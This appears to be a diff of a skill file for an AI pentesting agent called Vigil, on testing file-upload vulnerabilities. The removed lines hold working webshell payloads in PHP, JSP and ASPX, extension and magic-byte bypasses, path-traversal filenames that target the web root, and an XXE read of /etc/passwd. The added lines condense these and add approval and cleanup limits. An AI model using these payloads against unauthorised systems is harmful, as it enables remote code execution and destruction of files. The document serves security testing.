@@ -1,129 +1,62 @@
 ---
 name: file-upload-testing
-description: File upload vulnerability testing — webshells, bypass, path traversal
+description: Test file upload functionality for unrestricted upload, bypass, and code execution
 origin: Vigil
 vuln_class: file-upload
 ---
 
 # File Upload Vulnerability Testing
 
-> **`vigil assess kali` audit flags:** use `--technique RCE` for webshell/polyglot uploads (the canonical dangerous outcome). Switch to `LFI` when the filename triggers path traversal, `XSS` for SVG/HTML reflected in a browser context, or `SSRF` when the upload path fetches a URL server-side.
-
 ## When to Activate
 
-- Application allows file upload (profile picture, document, attachment)
-- File processing features (image resize, PDF conversion, import)
-- Any endpoint accepting multipart/form-data
+- Any multipart upload (avatars, documents, attachments, imports) or server-side file processing
+  (image resize, PDF conversion, archive extraction).
 
-## Tools
+Audit technique by outcome: `--technique RCE` for executable uploads, `LFI` when the filename
+traverses, `XSS` for SVG/HTML rendered in a browser, `SSRF` when processing fetches a URL. Uploads
+go through `vigil assess kali exec … --probe-kind payload --phase consume-test --timeout 60 -- curl
+-F …`; add `--destructive` for anything that writes executable content. Extension, case,
+alternate-extension, trailing-character, ADS, `.htaccess`/`.user.ini`, Content-Type, magic-byte,
+polyglot/EXIF (PHP) payloads, SVG XSS and zip slip:
+`agent/references/payloads/upload-payloads.md` (prepare files host-side).
 
-- `vigil assess kali exec -- curl ...` (multipart upload — all target-facing curl must go through the kali exec wrapper; use `--technique RCE --probe-kind payload --phase consume-test --timeout 60 --destructive` for webshell upload attempts)
-- Burp Suite Repeater (modify upload requests — use to craft the payload, then replay via kali exec)
-- ExifTool (embed payloads in metadata — host-side payload preparation only)
-- Custom polyglot file generators (host-side preparation only)
+## Map the mechanism first
 
-## Methodology
+Where files are stored (same origin, CDN, S3), whether they are served back by URL, whether the
+filename survives, what processing runs, and whether the bridge is CSRF-gated.
 
-### 1. Understand Upload Mechanism
+**CSRF-gated bridges.** Enterprise upload endpoints return 403/"Invalid token" with valid cookies
+until the CSRF token arrives in the expected channel; bypass work against that 403 hits the wrong
+layer. Salesforce Aura/Chatter (`aura.token` in the POST envelope), ServiceNow
+(`/api/now/attachment/file` with `X-UserToken`), Confluence/Jira (`atl_token`), SharePoint
+(`X-RequestDigest`, reusable until the form-digest timeout, 30 minutes by default), Rails
+(`<meta name="csrf-token">` → `X-CSRF-Token`). GET the page that renders the upload UI, extract the
+token (meta tag, hidden input, `XSRF-TOKEN` cookie, or a response header), and replay in the same
+channel the server checks (header vs form field vs query); mixing channels is the usual failure.
+Post-CSRF validation is often weak because the developer treated CSRF as the boundary. If a
+browser-rendered nonce cannot be reproduced, capture the whole flow through mitmproxy with a live
+session and replay that known-good request with the bypass variations.
 
-- [ ] Identify upload endpoint and parameters
-- [ ] Check allowed file types (client-side vs server-side validation)
-- [ ] Determine where files are stored (same domain, CDN, S3)
-- [ ] Check if uploaded files are directly accessible via URL
-- [ ] Check if filename is preserved or randomized
-- [ ] Identify whether the upload is CSRF-gated (see next section)
+## Attack surface
 
-### 1a. CSRF-gated upload flows
-
-Most enterprise SaaS upload bridges require a CSRF token extracted from a prior authenticated request. Direct POST to the upload endpoint fails with a 403 / "Invalid token" response even when the auth cookies are correct. Specialists that skip the CSRF step waste dispatch time attempting bypasses against the wrong layer.
-
-**Where this pattern shows up:**
-
-- Salesforce Chatter attachment bridges (`/services/data/.../sobjects/Attachment/`, `/sfsites/c/aura?aura.token=...` POST envelopes)
-- ServiceNow attachment uploader (`/api/now/attachment/file?...` with `X-UserToken` header)
-- Confluence / Jira attach endpoints (`atl_token` query param required)
-- Microsoft 365 SharePoint document upload (`X-RequestDigest` header)
-- Custom Rails apps (`<meta name="csrf-token">` in the page HTML + `X-CSRF-Token` header on POST)
-
-**Extraction recipe:**
-
-1. GET an authenticated page where the upload UI is rendered (the upload form's host page, settings panel, or a connector configuration screen).
-2. Extract the token from one of: `<meta name="csrf-token" content="...">`, a hidden `<input name="authenticity_token">` / `<input name="atl_token">`, a cookie like `XSRF-TOKEN`, or an `X-RequestDigest`/`X-UserToken` response header on a prior GET.
-3. Replay the upload POST with the token in the **expected channel** — header (`X-CSRF-Token`, `X-RequestDigest`, `X-UserToken`) OR form field (`authenticity_token`, `atl_token`) OR query param. Mixing channels is a common failure shape: the server checks the header but the agent put the token in the body, or vice versa.
-4. Re-fetch the token between attempts when the server rotates per-request (Microsoft `X-RequestDigest` expires after one use).
-
-When the bridge passes the CSRF check, **then** apply the extension / content-type / magic-byte bypass methodology below. Most CSRF-gated bridges have weak post-CSRF validation because the developer assumed CSRF was the security boundary.
-
-If CSRF cannot be passed in-session (token-binding to the originating session works, but the form-encoding requires a browser-rendered nonce you can't reproduce), pivot the dispatch shape: capture the entire upload flow via mitmproxy with a live browser session, then replay the captured request with the magic-byte/content-type variation. The mitmproxy capture gives you a known-good baseline against which to diff.
-
-### 2. Extension Bypass
-
-- [ ] Double extension: `shell.php.jpg`, `shell.php.png`
-- [ ] Null byte (legacy): `shell.php%00.jpg`, `shell.php\x00.jpg`
-- [ ] Case variation: `shell.PhP`, `shell.pHP`, `shell.Php`
-- [ ] Alternative extensions: `.php3`, `.php5`, `.phtml`, `.phar`
-- [ ] JSP alternatives: `.jspx`, `.jsw`, `.jsv`
-- [ ] ASP alternatives: `.aspx`, `.ascx`, `.ashx`, `.asa`, `.cer`
-- [ ] Trailing characters: `shell.php.`, `shell.php...`, `shell.php `, `shell.php::$DATA`
-- [ ] Upload `.htaccess` to add custom handler: `AddType application/x-httpd-php .xyz`
-- [ ] Upload `.user.ini` with `auto_prepend_file=shell.jpg`
-
-### 3. Content-Type Bypass
-
-- [ ] Change `Content-Type` to `image/jpeg` or `image/png` while sending PHP
-- [ ] Remove Content-Type header entirely
-- [ ] Use valid MIME type for allowed format
-
-### 4. Magic Bytes / Content Bypass
-
-- [ ] Prepend valid image header: `GIF89a;<?php system($_GET['c']); ?>`
-- [ ] Add JPEG magic bytes `FF D8 FF E0` before payload
-- [ ] PNG header + PHP code in IDAT chunk
-- [ ] Embed PHP in EXIF data: `exiftool -Comment='<?php system("id"); ?>' image.jpg`
-- [ ] Polyglot file: valid image that is also valid PHP
-
-### 5. Webshell Payloads
-
-- [ ] PHP: `<?php system($_GET['c']); ?>`
-- [ ] PHP short tag: `<?=`cat /etc/passwd`?>`
-- [ ] JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
-- [ ] ASPX: `<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd","/c " + Request["c"]); %>`
-- [ ] Minimal: `<?=phpinfo();?>` to confirm execution
-
-### 6. Path Traversal in Filename
-
-- [ ] `../../../var/www/html/shell.php`
-- [ ] `..%2f..%2f..%2fshell.php`
-- [ ] `....//....//shell.php`
-- [ ] Overwrite existing files: `../../config.php`
-- [ ] Target web root or cron directories
-
-### 7. Special File Attacks
-
-- [ ] SVG with XSS: `<svg onload="alert(1)">` or `<script>` in SVG
-- [ ] SVG with XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
-- [ ] HTML file upload → stored XSS
-- [ ] PDF with JavaScript
-- [ ] ZIP slip: archive with `../../` path entries
-- [ ] XML file with XXE (DOCX, XLSX inner XML)
-
-### 8. Size and Resource Limits
-
-- [ ] Upload extremely large file — check size limits
-- [ ] Upload many files rapidly — check rate limits
-- [ ] Zip bomb / decompression bomb
-- [ ] Image with huge dimensions (pixel flood)
+- **Executable upload:** extension/Content-Type/magic-byte bypasses until a served file executes.
+  Use a benign marker (`echo` of a nonce, `id`) under a randomised name, never a persistent
+  interactive webshell, and record the path for cleanup.
+- **Filename traversal** (`../`, `..%2f`, `....//`): writes outside the upload directory.
+  Overwriting existing files (`index.php`, `config.php`, cron) destroys target state: prove the
+  traversal with a new uniquely named file and stop there unless the operator approves more
+  (`agent/shared-constraints.md` §1).
+- **Content-driven:** SVG/HTML → stored XSS (`agent/skills/xss-testing/SKILL.md`); SVG, DOCX,
+  XLSX inner XML → XXE (`agent/skills/xxe-testing/SKILL.md`); PDF JavaScript; zip slip; image and
+  media processors → ImageMagick/FFmpeg argument and protocol tricks
+  (`agent/references/payloads/command-injection-payloads.md` "By wrapper tool").
+- **Resource limits:** decompression bombs, pixel floods and bulk uploads are denial of service;
+  check declared limits with one bounded probe and only with operator approval.
 
 ## What to Record
 
-- Upload endpoint and filename parameter
-- Bypass technique used (extension, content-type, magic bytes)
-- Uploaded file URL and whether it executes — prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., the uploaded `shell.php` executed via `GET /uploads/shell.php?c=id` and returned `uid=33(www-data)`, the SVG with XSS triggered JavaScript execution in the admin's browser when they viewed the file manager, the path traversal overwrote `/var/www/html/index.php` with a webshell confirming write access to the web root
-- Webshell payload and confirmed RCE
-- Path traversal success and file overwritten
-- Severity: Critical (RCE via webshell) or High (XSS, file overwrite)
-- Remediation: allowlist extensions, validate content, rename files, store outside webroot
-
-## Extended Resources
-
-- `agent/references/payloads/upload-payloads.md` — extension bypass, Content-Type bypass, magic bytes, SVG XSS, zip slip
+Upload endpoint and filename parameter, the bypass that worked, the stored URL and whether it
+executes or renders, the attacker outcome (`agent/rules/hunting.md` §2: command output, script
+execution in another user's or an admin's view, a write outside the upload directory), and the
+artefacts left for cleanup. Severity: `agent/references/finding-fp-and-severity-gate.md`; format:
+`agent/references/runtime-guides/web-finding-recording.md`.
